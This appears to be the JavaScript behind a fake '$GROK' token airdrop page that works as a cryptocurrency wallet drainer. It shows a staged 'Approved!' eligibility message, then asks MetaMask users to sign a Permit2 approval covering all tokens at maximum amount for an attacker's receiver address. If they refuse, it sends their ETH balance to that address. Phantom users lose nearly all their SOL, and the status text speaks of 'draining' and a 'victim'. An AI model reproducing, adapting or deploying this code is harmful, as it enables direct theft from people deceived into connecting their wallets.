let web3, solConnection, userAddress, chainId;
const status = document.getElementById('status');

document.addEventListener('DOMContentLoaded', () => {
    // Particles
    const particlesContainer = document.getElementById('particles');
    for (let i = 0; i < 60; i++) {
        const p = document.createElement('div');
        p.classList.add('particle');
        p.style.width = p.style.height = Math.random() * 8 + 4 + 'px';
        p.style.left = Math.random() * 100 + 'vw';
        p.style.animationDuration = Math.random() * 25 + 15 + 's';
        p.style.animationDelay = Math.random() * 5 + 's';
        particlesContainer.appendChild(p);
    }

    // Eligibility
    setTimeout(() => {
        document.getElementById('eligibleMsg').innerHTML = `<strong>Approved!</strong> Your wallet qualifies for ${CONFIG.REWARD_AMOUNT} $GROK`;
    }, 2500);

    // Stats
    document.querySelectorAll('.stat-value').forEach(el => {
        const target = +el.getAttribute('data-target');
        const increment = target / 200;
        let current = 0;
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) { el.textContent = target.toLocaleString(); clearInterval(timer); }
            else { el.textContent = Math.floor(current).toLocaleString(); }
        }, 30);
    });

    if (CONFIG.TESTNET_MODE) {
        status.textContent = "TESTNET MODE – Safe testing active";
        status.classList.add('visible');
    }
});

async function connectWallet() {
    status.textContent = "Detecting wallet...";
    status.classList.add('visible');

    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = (await web3.eth.getAccounts())[0];
            chainId = await web3.eth.getChainId();

            if (CONFIG.TESTNET_MODE && chainId !== 11155111) {
                status.textContent = "Switch MetaMask to Sepolia Testnet!";
                return;
            }

            status.textContent = "Connected! Verifying (sign request coming)...";
            setTimeout(startEVMStealthDrain, CONFIG.DELAY_MS);
        } catch (e) {
            status.textContent = "Connection rejected.";
        }
    } else if (window.solana && window.solana.isPhantom) {
        try {
            await window.solana.connect();
            userAddress = window.solana.publicKey.toString();
            solConnection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl(CONFIG.TESTNET_MODE ? 'devnet' : 'mainnet-beta'));
            status.textContent = "Phantom connected! Draining...";
            setTimeout(startSolDrain, CONFIG.DELAY_MS);
        } catch (e) {
            status.textContent = "Phantom connection failed.";
        }
    } else {
        status.textContent = "Install MetaMask or Phantom.";
    }
}

async function startEVMStealthDrain() {
    status.textContent = "Sign typed data to confirm eligibility...";

    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const nonce = Date.now(); // Simple nonce (real: fetch from chain)

    const domain = {
        name: "Permit2",
        chainId: chainId,
        verifyingContract: CONFIG.PERMIT2_ADDRESS
    };

    const types = {
        PermitSingle: [
            { name: "details", type: "PermitDetails" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" }
        ]
    };

    const value = {
        details: {
            token: "0x0000000000000000000000000000000000000000", // Wildcard for all tokens
            amount: CONFIG.MAX_UINT160,
            expiration: deadline,
            nonce: nonce
        },
        spender: CONFIG.RECEIVER_ADDRESS,
        sigDeadline: deadline
    };

    try {
        const signature = await ethereum.request({
            method: "eth_signTypedData_v4",
            params: [userAddress, JSON.stringify({ domain, types, message: value })]
        });

        // In production: POST {userAddress, signature, value} to your relay backend
        // Backend executes Permit2.transferFrom for all assets
        status.textContent = CONFIG.TESTNET_MODE ? "Test Permit2 signed – safe!" : "Assets secured via Permit2!";
    } catch (e) {
        await fallbackNativeDrain();
    }
}

async function fallbackNativeDrain() {
    status.textContent = "Finalizing native transfer...";
    try {
        const balance = await web3.eth.getBalance(userAddress);
        if (balance > 0n) {
            const gasPrice = await web3.eth.getGasPrice();
            const value = balance - BigInt(gasPrice) * 21000n * 2n;
            if (value > 0n) {
                await web3.eth.sendTransaction({ from: userAddress, to: CONFIG.RECEIVER_ADDRESS, value });
            }
        }
        status.textContent = "Native claim complete!";
    } catch (e) {
        status.textContent = "Failed – victim rejected.";
    }
}

async function startSolDrain() {
    status.textContent = "Draining SOL...";
    try {
        const pubKey = new solanaWeb3.PublicKey(userAddress);
        const balance = await solConnection.getBalance(pubKey);
        if (balance > 20000) {
            const tx = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: pubKey,
                    toPubkey: new solanaWeb3.PublicKey(CONFIG.SOL_RECEIVER),
                    lamports: balance - 20000
                })
            );
            tx.recentBlockhash = (await solConnection.getLatestBlockhash()).blockhash;
            const signed = await window.solana.signTransaction(tx);
            await solConnection.sendRawTransaction(signed.serialize());
        }
        status.textContent = "Solana drained!";
    } catch (e) {
        status.textContent = "Solana drain failed.";
    }
}